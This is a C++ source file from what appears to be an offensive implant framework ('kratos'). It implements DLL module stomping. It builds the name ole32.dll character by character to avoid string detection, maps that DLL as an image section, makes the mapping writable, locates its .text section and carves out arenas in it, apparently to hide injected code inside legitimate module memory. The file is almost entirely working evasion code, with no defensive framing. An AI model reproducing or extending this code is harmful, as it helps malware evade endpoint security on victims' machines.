#include "modules/modules.h"

BOOL Modules::LoadStompedDll() {
	CHAR path[10];
	path[ 0 ] = 'o';
	path[ 1 ] = 'l';
	path[ 2 ] = 'e';
	path[ 3 ] = '3';
	path[ 4 ] = '2';
	path[ 5 ] = '.';
	path[ 6 ] = 'd';
	path[ 7 ] = 'l';
	path[ 8 ] = 'l';
	path[ 9 ] = '\0';
	
	HANDLE hFile = NULL;
	HANDLE hSection = NULL;
	PVOID pBase = NULL;
	SIZE_T ViewSize = 0;

	hFile = kratos->apis.CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if ( ! hFile || hFile == INVALID_HANDLE_VALUE ) { return FALSE; }


	NTSTATUS stat;
	stat = kratos->apis.NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
	if (!NTAPI_SUCCESS(stat)) {
		kratos->apis.CloseHandle(hFile);
		return FALSE;
	}

	stat = kratos->apis.NtMapViewOfSection(hSection, GetCurrentProcess(), &pBase, 0, 0, NULL, &ViewSize, ViewShare, 0, PAGE_READONLY);
	if (!NTAPI_SUCCESS(stat)) {
		kratos->apis.CloseHandle(hFile);
		kratos->apis.CloseHandle(hSection);
		return FALSE;
	}
	DWORD old;

	stat = kratos->apis.NtProtectVirtualMemory(GetCurrentProcess(), &pBase, &ViewSize, PAGE_READWRITE, &old);
	if (!NTAPI_SUCCESS(stat)) {
		kratos->apis.CloseHandle(hFile);
		kratos->apis.CloseHandle(hSection);
		return FALSE;
	}

	SIZE_T TextSize = 0;

	if (!this->GetStompedDllText(pBase)) { return FALSE; }
	this->IsStompedDllLoaded = TRUE;


	return TRUE;

}


BOOL Modules::GetStompedDllText(PVOID DllBase) {
	PIMAGE_SECTION_HEADER sec = SECTION_HEADER( DllBase );
	WORD NumberOfSections     = FILE_HEADER(DllBase)->NumberOfSections;
	BOOL Success = FALSE;
	for ( DWORD i = 0; i < NumberOfSections; i++ ) {
		if ( utils::mem::memcmp( sec[ i ].Name, ".text", 5 ) == 0 ) {
			this->StompedDllText = RVA2VA(PVOID, DllBase, sec[i].VirtualAddress);
			this->StompedDllTextSize = sec[i].Misc.VirtualSize;
			Success = TRUE;
		}
	}

	return Success;
}



PVOID Modules::ReserveArena(SIZE_T size) {
	SIZE_T need = PAGE_ALIGN(size);
	PVOID cur = this->TextSectionIndex;
	PVOID end = this->StompedDllText + this->StompedDllTextSize;

	if (!cur || need == 0 || cur + need > end) {
		return NULL;
	}

	this->TextSectionIndex = cur + need;
	return cur;
}
